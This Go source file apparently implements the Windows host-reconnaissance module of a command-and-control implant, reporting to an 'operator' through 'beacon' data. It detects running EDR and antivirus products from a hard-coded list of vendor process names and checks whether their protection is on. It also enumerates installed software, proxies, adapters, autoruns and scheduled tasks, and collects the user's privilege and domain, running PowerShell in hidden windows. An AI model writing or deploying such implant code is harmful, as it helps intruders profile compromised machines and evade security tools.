//go:build windows
// +build windows

package main

// Windows collectors for the hostinfo task. Every function returns a plain
// map that is marshalled into the report by task_hostinfo.go; failures are
// reported inline as {"error": ...} so one broken source never blinds the
// operator. Collection is strictly read-only (WMI queries, registry reads,
// directory listings).

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strings"

	"golang.org/x/sys/windows/registry"
)

// edrProcessNames maps lowercase process base names (no .exe) to product
// labels for runtime EDR detection. Mirrors the indicator list used by the
// environment classifier.
var edrProcessNames = map[string]string{
	"csagent": "CrowdStrike Falcon", "csfalcon": "CrowdStrike Falcon", "csscan": "CrowdStrike Falcon",
	"cb": "Carbon Black", "cbdefense": "Carbon Black", "repmgr": "Carbon Black", "cbserver": "Carbon Black",
	"parity":        "Carbon Black",
	"sentinelagent": "SentinelOne", "sentinelagentworker": "SentinelOne", "sentinelstaticengine": "SentinelOne",
	"cylancesvc": "Cylance", "cylanceoptics": "Cylance", "hmpalert": "Cylance",
	"pssvc": "Palo Alto Traps", "cyserver": "Palo Alto Traps", "traps": "Palo Alto Traps",
	"sophoshealth": "Sophos", "sspservice": "Sophos", "sophosfs": "Sophos", "sophosedr": "Sophos",
	"tmbmsrv": "Trend Micro", "ntrtscan": "Trend Micro", "ofcservice": "Trend Micro",
	"mssense": "Microsoft Defender for Endpoint", "senseir": "Microsoft Defender for Endpoint",
	"msmpeng": "Microsoft Defender Antivirus", "nissrv": "Microsoft Defender Antivirus",
	"mcshield": "McAfee", "masvc": "McAfee", "mfetp": "McAfee",
	"symantec": "Symantec", "ccsvchst": "Symantec", "sepmaster": "Symantec",
	"ekrn": "ESET", "avp": "Kaspersky", "bdagent": "Bitdefender",
	"aswidsagenta": "Avast", "avgsvc": "AVG", "avgnt": "Avira",
	"swc_service": "Webroot", "ufseaglemgrservice": "F-Secure",
}

// decodeProductState applies the community-known SecurityCenter2 productState
// heuristic: with the value rendered as six hex digits, digits[2:4] encode the
// real-time protection toggle ("10" enabled, "00"/"01" disabled) and
// digits[4:6] the signature freshness ("00" current, "10" outdated). It is a
// heuristic, not a contract — unknown shapes surface as "unknown".
func decodeProductState(state int) (enabled string, signatures string) {
	hex := fmt.Sprintf("%06X", state)
	if len(hex) != 6 {
		return "unknown", "unknown"
	}
	switch hex[2:4] {
	case "10":
		enabled = "enabled"
	case "00", "01":
		enabled = "disabled"
	default:
		enabled = "unknown"
	}
	switch hex[4:6] {
	case "00":
		signatures = "up_to_date"
	case "10":
		signatures = "outdated"
	default:
		signatures = "unknown"
	}
	return enabled, signatures
}

// runHostInfoPS runs one PowerShell snippet and returns trimmed stdout.
func runHostInfoPS(script string) (string, error) {
	cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", script)
	applyHideWindow(cmd)
	out, err := cmd.Output()
	return strings.TrimSpace(string(out)), err
}

// collectHostSecurity gathers AV products (SecurityCenter2), running EDR
// processes and a keyword-filtered view of security-relevant services.
func collectHostSecurity() map[string]any {
	out := map[string]any{"platform": "windows"}

	// One PowerShell round-trip produces structured JSON for AV + EDR
	// processes; text-table parsing would be locale-fragile.
	nameList := make([]string, 0, len(edrProcessNames))
	for name := range edrProcessNames {
		nameList = append(nameList, name)
	}
	sort.Strings(nameList)
	script := fmt.Sprintf(`
$ErrorActionPreference = 'SilentlyContinue'
$av = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct |
    Select-Object displayName, productState | ConvertTo-Json -Compress
$names = @('%s')
$procs = Get-Process | Where-Object { $names -contains $_.ProcessName.ToLower() } |
    Select-Object ProcessName, Id | ConvertTo-Json -Compress
[Console]::OutputEncoding = [Text.Encoding]::UTF8
@{ av = $av; edr_procs = $procs } | ConvertTo-Json -Compress -Depth 3
`, strings.Join(nameList, "','"))

	raw, err := runHostInfoPS(script)
	if err != nil || raw == "" {
		// Fallback: at least carry the legacy textual AV view so the operator
		// gets something instead of silence.
		if txt, ferr := detectAV(); ferr == nil {
			out["av_raw"] = strings.TrimRight(txt, "\r\n")
		}
		out["error"] = "security query failed: " + fmt.Sprint(err)
		return out
	}

	var parsed struct {
		Av       json.RawMessage `json:"av"`
		EdrProcs json.RawMessage `json:"edr_procs"`
	}
	if jerr := json.Unmarshal([]byte(raw), &parsed); jerr != nil {
		out["error"] = "security query decode failed: " + jerr.Error()
		return out
	}

	// Normalize AV entries: single object vs array vs null.
	var avRows []map[string]any
	appendAV := func(display any, state any) {
		s := int(0)
		switch v := state.(type) {
		case float64:
			s = int(v)
		case string:
			fmt.Sscanf(v, "%d", &s)
		}
		enabled, sigs := decodeProductState(s)
		avRows = append(avRows, map[string]any{
			"name":       display,
			"state_hex":  fmt.Sprintf("0x%06X", s),
			"protection": enabled,
			"signatures": sigs,
		})
	}
	var single struct {
		DisplayName  any `json:"displayName"`
		ProductState any `json:"productState"`
	}
	if jerr := json.Unmarshal(parsed.Av, &single); jerr == nil && single.DisplayName != nil {
		appendAV(single.DisplayName, single.ProductState)
	} else {
		var rows []struct {
			DisplayName  any `json:"displayName"`
			ProductState any `json:"productState"`
		}
		if jerr := json.Unmarshal(parsed.Av, &rows); jerr == nil {
			for _, r := range rows {
				appendAV(r.DisplayName, r.ProductState)
			}
		}
	}
	if avRows == nil {
		avRows = []map[string]any{}
	}
	out["av_products"] = avRows

	// Normalize EDR process hits: single object vs array vs null.
	var edrHits []map[string]any
	appendProc := func(name any, pid any) {
		label := "Unknown EDR"
		key := strings.ToLower(fmt.Sprint(name))
		if l, ok := edrProcessNames[key]; ok {
			label = l
		}
		edrHits = append(edrHits, map[string]any{"process": name, "pid": pid, "product": label})
	}
	var procSingle struct {
		ProcessName any `json:"ProcessName"`
		Id          any `json:"Id"`
	}
	if jerr := json.Unmarshal(parsed.EdrProcs, &procSingle); jerr == nil && procSingle.ProcessName != nil {
		appendProc(procSingle.ProcessName, procSingle.Id)
	} else {
		var procs []struct {
			ProcessName any `json:"ProcessName"`
			Id          any `json:"Id"`
		}
		if jerr := json.Unmarshal(parsed.EdrProcs, &procs); jerr == nil {
			for _, p := range procs {
				appendProc(p.ProcessName, p.Id)
			}
		}
	}
	if edrHits == nil {
		edrHits = []map[string]any{}
	}
	out["edr_processes"] = edrHits

	return out
}

// collectHostSystem reports OS install/boot times, architecture and a memory
// snapshot, plus the identity/integrity fields already computed per beacon.
func collectHostSystem() map[string]any {
	out := map[string]any{"platform": "windows"}

	raw, err := runHostInfoPS(`Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber, OSArchitecture, InstallDate, LastBootUpTime, TotalVisibleMemorySize, FreePhysicalMemory | ConvertTo-Json -Compress`)
	if err != nil || raw == "" {
		out["error"] = "os query failed: " + fmt.Sprint(err)
	} else {
		var osInfo map[string]any
		if jerr := json.Unmarshal([]byte(raw), &osInfo); jerr != nil {
			out["error"] = "os query decode failed: " + jerr.Error()
		} else {
			out["os"] = osInfo
			if total, ok := osInfo["TotalVisibleMemorySize"].(float64); ok {
				if free, ok2 := osInfo["FreePhysicalMemory"].(float64); ok2 && total > 0 {
					used := total - free
					out["memory"] = map[string]any{
						"total_kb": uint64(total),
						"free_kb":  uint64(free),
						"used_pct": fmt.Sprintf("%.1f%%", used/total*100),
					}
				}
			}
		}
	}

	// Identity fields come straight from the per-beacon computation so the
	// profile can never disagree with what the server already recorded.
	// (username/integrity/elevated/domain are plain strings; only hostname/ip
	// ride base64 in the beacon info map.)
	if info := getSystemInfo(); info != nil {
		for _, k := range []string{"username", "integrity", "elevated", "domain"} {
			if v, ok := info[k]; ok && v != "" {
				out[k] = v
			}
		}
	}
	return out
}

// collectHostSoftware enumerates installed software from the Uninstall views
// of HKLM (native + WOW6432Node) and HKCU. filter is a case-insensitive
// substring match on the display name; empty keeps everything (capped).
func collectHostSoftware(filter string) map[string]any {
	const maxEntries = 500
	type swEntry struct {
		Name        string `json:"name"`
		Version     string `json:"version,omitempty"`
		Publisher   string `json:"publisher,omitempty"`
		InstallDate string `json:"install_date,omitempty"`
	}
	roots := []struct {
		hive registry.Key
		path string
	}{
		{registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall`},
		{registry.LOCAL_MACHINE, `SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall`},
		{registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall`},
	}

	lowerFilter := strings.ToLower(filter)
	entries := make([]swEntry, 0, 64)
	truncated := false
	for _, root := range roots {
		k, err := registry.OpenKey(root.hive, root.path, registry.ENUMERATE_SUB_KEYS)
		if err != nil {
			continue
		}
		names, kerr := k.ReadSubKeyNames(-1)
		k.Close()
		if kerr != nil {
			continue
		}
		for _, sub := range names {
			if len(entries) >= maxEntries {
				truncated = true
				break
			}
			sk, serr := registry.OpenKey(root.hive, root.path+`\`+sub, registry.READ)
			if serr != nil {
				continue
			}
			name, _, _ := sk.GetStringValue("DisplayName")
			if name == "" {
				sk.Close()
				continue
			}
			if lowerFilter != "" && !strings.Contains(strings.ToLower(name), lowerFilter) {
				sk.Close()
				continue
			}
			e := swEntry{Name: name}
			if vers, _, verr := sk.GetStringValue("DisplayVersion"); verr == nil {
				e.Version = vers
			}
			if pub, _, perr := sk.GetStringValue("Publisher"); perr == nil {
				e.Publisher = pub
			}
			if date, _, derr := sk.GetStringValue("InstallDate"); derr == nil {
				e.InstallDate = date
			}
			sk.Close()
			entries = append(entries, e)
		}
		if truncated {
			break
		}
	}
	if entries == nil {
		entries = []swEntry{}
	}
	return map[string]any{
		"software":  entries,
		"count":     len(entries),
		"truncated": truncated,
		"filter":    filter,
	}
}

// collectHostNetwork reports non-loopback adapters, proxy configuration
// (WinINET registry + environment) and the observed egress address.
func collectHostNetwork() map[string]any {
	out := map[string]any{"platform": "windows"}

	adapters := []map[string]any{}
	if ifaces, err := net.Interfaces(); err == nil {
		for _, ifc := range ifaces {
			if ifc.Flags&net.FlagLoopback != 0 {
				continue
			}
			entry := map[string]any{
				"name": ifc.Name,
				"mac":  ifc.HardwareAddr.String(),
				"up":   ifc.Flags&net.FlagUp != 0,
			}
			addrs := []string{}
			if addrList, aerr := ifc.Addrs(); aerr == nil {
				for _, a := range addrList {
					addrs = append(addrs, a.String())
				}
			}
			entry["addresses"] = addrs
			adapters = append(adapters, entry)
		}
	}
	out["adapters"] = adapters

	proxy := map[string]any{}
	if k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Internet Settings`, registry.READ); err == nil {
		enable, _, _ := k.GetIntegerValue("ProxyEnable")
		proxy["wininet_enabled"] = enable != 0
		if server, _, serr := k.GetStringValue("ProxyServer"); serr == nil {
			proxy["wininet_server"] = server
		}
		if pac, _, perr := k.GetStringValue("AutoConfigURL"); perr == nil {
			proxy["autoconfig_url"] = pac
		}
		k.Close()
	}
	for _, envName := range []string{"HTTP_PROXY", "HTTPS_PROXY", "NO_PROXY"} {
		if v := os.Getenv(envName); v != "" {
			proxy[strings.ToLower(envName)] = v
		}
	}
	out["proxy"] = proxy

	if ip := getOutboundIP(); ip != "" {
		out["egress_ip"] = ip
	}
	return out
}

// collectHostRuntime reports autoruns (Run/RunOnce values + Startup folders),
// a brief scheduled-task listing and the account's last-logon stamp where the
// platform exposes it.
func collectHostRuntime() map[string]any {
	out := map[string]any{"platform": "windows"}

	autoruns := []map[string]string{}
	runPaths := []struct {
		hive registry.Key
		path string
	}{
		{registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`},
		{registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\RunOnce`},
		{registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`},
		{registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce`},
	}
	for _, rp := range runPaths {
		k, err := registry.OpenKey(rp.hive, rp.path, registry.READ)
		if err != nil {
			continue
		}
		valueNames, _ := k.ReadValueNames(-1)
		for _, vn := range valueNames {
			val, _, verr := k.GetStringValue(vn)
			if verr != nil {
				continue
			}
			autoruns = append(autoruns, map[string]string{
				"source": rp.path, "name": vn, "command": val,
			})
		}
		k.Close()
	}
	startupDirs := []string{
		filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Start Menu\Programs\Startup`),
		`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`,
	}
	for _, dir := range startupDirs {
		if items, err := os.ReadDir(dir); err == nil {
			for _, it := range items {
				autoruns = append(autoruns, map[string]string{
					"source": "startup_folder", "name": it.Name(), "command": filepath.Join(dir, it.Name()),
				})
			}
		}
	}
	out["autoruns"] = autoruns

	// Scheduled tasks: CSV output headers are locale-dependent, so only the
	// raw rows are surfaced (first N) rather than pretending to parse them.
	if raw, err := runShell("schtasks /query /fo csv /nh", "cmd.exe"); err == nil {
		lines := strings.Split(strings.TrimSpace(raw), "\n")
		if len(lines) > 25 {
			lines = lines[:25]
		}
		out["scheduled_tasks_sample"] = strings.TrimSpace(strings.Join(lines, "\n"))
		out["scheduled_tasks_note"] = "raw csv rows (locale-dependent), capped at 25"
	}

	// Last logon: `net user` output is English-only on most SKUs; anything
	// else degrades to reporting availability instead of wrong data.
	username := os.Getenv("USERNAME")
	if username != "" {
		if raw, err := runShell("net user "+username, "cmd.exe"); err == nil {
			lastLogon := ""
			for _, line := range strings.Split(raw, "\n") {
				if strings.HasPrefix(line, "Last logon") {
					lastLogon = strings.TrimSpace(strings.TrimPrefix(line, "Last logon"))
					break
				}
			}
			if lastLogon != "" {
				out["last_logon"] = lastLogon
			} else {
				out["last_logon_note"] = "not exposed by net user (localized output or DC-managed account)"
			}
		}
	}
	return out
}
